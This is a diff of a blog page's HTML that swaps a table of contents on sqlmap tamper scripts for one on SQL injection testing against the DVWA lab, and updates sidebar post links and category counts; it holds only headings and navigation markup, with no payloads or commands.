+        <a class="is-flex" href="#简单的ID查询">
+        <span class="has-mr-6">1.1.3</span>
+        <span>简单的ID查询</span>
         </a></li><li>
-        <a class="is-flex" href="#dependencies函数">
-        <span class="has-mr-6">4</span>
-        <span>dependencies函数</span>
+        <a class="is-flex" href="#检测是否存在注入">
+        <span class="has-mr-6">1.1.4</span>
+        <span>检测是否存在注入</span>
         </a></li><li>
-        <a class="is-flex" href="#tamper函数">
-        <span class="has-mr-6">5</span>
-        <span>tamper函数</span>
+        <a class="is-flex" href="#遍历数据库表">
+        <span class="has-mr-6">1.1.5</span>
+        <span>遍历数据库表</span>
         </a></li><li>
-        <a class="is-flex" href="#kwargs">
-        <span class="has-mr-6">6</span>
-        <span>kwargs</span>
+        <a class="is-flex" href="#查询信息列表长度">
+        <span class="has-mr-6">1.1.6</span>
+        <span>查询信息列表长度</span>
         </a></li><li>
-        <a class="is-flex" href="#结语">
-        <span class="has-mr-6">7</span>
-        <span>结语</span>
+        <a class="is-flex" href="#获取数据库名称、账户名、版本及操作系统信息">
+        <span class="has-mr-6">1.1.7</span>
+        <span>获取数据库名称、账户名、版本及操作系统信息</span>
         </a></li><li>
-        <a class="is-flex" href="#实例">
-        <span class="has-mr-6">8</span>
-        <span>实例</span>
-        </a></li></ul>
+        <a class="is-flex" href="#查询mysql数据库所有数据库及表">
+        <span class="has-mr-6">1.1.8</span>
+        <span>查询mysql数据库所有数据库及表</span>
+        </a></li><li>
+        <a class="is-flex" href="#猜解表名">
+        <span class="has-mr-6">1.1.9</span>
+        <span>猜解表名</span>
+        </a></li><li>
+        <a class="is-flex" href="#猜解字段名">
+        <span class="has-mr-6">1.1.10</span>
+        <span>猜解字段名</span>
+        </a></li><li>
+        <a class="is-flex" href="#爆出数据库中字段内容">
+        <span class="has-mr-6">1.1.11</span>
+        <span>爆出数据库中字段内容</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#代码分析">
+        <span class="has-mr-6">1.2</span>
+        <span>代码分析</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#low等级源代码">
+        <span class="has-mr-6">1.2.1</span>
+        <span>low等级源代码</span>
+        </a></li><li>
+        <a class="is-flex" href="#中等等级代码分析">
+        <span class="has-mr-6">1.2.2</span>
+        <span>中等等级代码分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#高等级代码分析">
+        <span class="has-mr-6">1.2.3</span>
+        <span>高等级代码分析</span>
+        </a></li></ul></li></ul></li></ul>
             </div>
         </div>
     </div>
@@ -480,8 +532,21 @@
             
             <div class="media-content">
                 <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-02-25T14:00:48.000Z">2020-02-25</time></div>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading notes of &lt;Machine Learning&gt; Chapter2</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Machine-Learning/">Machine Learning</a> / <a class="has-link-grey -link" href="/categories/Machine-Learning/Model-evaluation-and-selection/">Model evaluation and selection</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <div class="media-content">
+                <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-02-25T09:00:22.000Z">2020-02-25</time></div>
-                    <a href="/2020/02/25/ML-notes-chapter1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">&lt;Machine learning&gt; -- Introduction</a>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading notes of &lt;Machine learning&gt; Chapter1</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/Machine-Learning/">Machine Learning</a> / <a class="has-link-grey -link" href="/categories/Machine-Learning/Introduction/">Introduction</a>
                     </p>
@@ -494,7 +559,7 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-08T20:11:03.000Z">2020-01-09</time></div>
-                    <a href="/2020/01/09/NER-survey-notes/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading Notes of &lt;A Survey on Deep Learning for Named Entity Recognition&gt;</a>
+                    <a href="/2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Reading Notes of &lt;A Survey on Deep Learning for Named Entity Recognition&gt;</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
                     </p>
@@ -507,7 +572,7 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-09T08:06:45.000Z">2019-05-09</time></div>
-                    <a href="/2019/05/09/word2vec-presentation/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Word2vec的文档表示方法</a>
+                    <a href="/2019/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Word2vec的文档表示方法</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
                     </p>
@@ -520,22 +585,9 @@
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-05-08T22:24:49.000Z">2019-05-09</time></div>
-                    <a href="/2019/05/09/Wordng-vec-webshell-detect/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Use Word-NG vec to detect WebShell</a>
+                    <a href="/2019/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Use Word-NG vec to detect WebShell</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/NLP/">NLP</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
-        <article class="media">
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-05-09T00:17:26.000Z">2018-05-09</time></div>
-                    <a href="/2018/05/09/RSA-in-ctf/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CTF中RSA的常见攻击方法</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
                     </p>
                 </div>
             </div>
@@ -569,12 +621,20 @@
                 <span class="level-item">Machine Learning</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">1</span>
+                <span class="level-item tag">2</span>
             </span>
         </a><ul><li>
         <a class="level is-marginless" href="/categories/Machine-Learning/Introduction/">
             <span class="level-start">
                 <span class="level-item">Introduction</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Machine-Learning/Model-evaluation-and-selection/">
+            <span class="level-start">
+                <span class="level-item">Model evaluation and selection</span>
             </span>
             <span class="level-end">
                 <span class="level-item tag">1</span>
@@ -623,7 +683,7 @@
                     <span class="level-item">February 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -750,7 +810,7 @@
                 <div class="control">
                     <a class="tags has-addons" href="/tags/ML/">
                         <span class="tag">ML</span>
-                        <span class="tag is-grey">1</span>
+                        <span class="tag is-grey">2</span>
                     </a>
                 </div>
                 
@@ -862,12 +922,20 @@
                 <span class="level-item">Machine Learning</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">1</span>
+                <span class="level-item tag">2</span>
             </span>
         </a><ul><li>
         <a class="level is-marginless" href="/categories/Machine-Learning/Introduction/">
             <span class="level-start">
                 <span class="level-item">Introduction</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Machine-Learning/Model-evaluation-and-selection/">
+            <span class="level-start">
+                <span class="level-item">Model evaluation and selection</span>
             </span>
             <span class="level-end">
                 <span class="level-item tag">1</span>
@@ -916,7 +984,7 @@
                     <span class="level-item">February 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">1</span>
+                    <span class="level-item tag">2</span>
                 </span>
             </a>
         </li>
@@ -1043,7 +1111,7 @@
                 <div class="control">
                     <a class="tags has-addons" href="/tags/ML/">
                         <span class="tag">ML</span>
-                        <span class="tag is-grey">1</span>
+                        <span class="tag is-grey">2</span>
                     </a>
                 </div>
                 
@@ -1134,7 +1202,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="sqlmap tamper 脚本编写" height="28">
+                    <img src="/images/logo.svg" alt="DVWA的SQL注入测试" height="28">
                 
                 </a>
                 <p class="is-size-7">
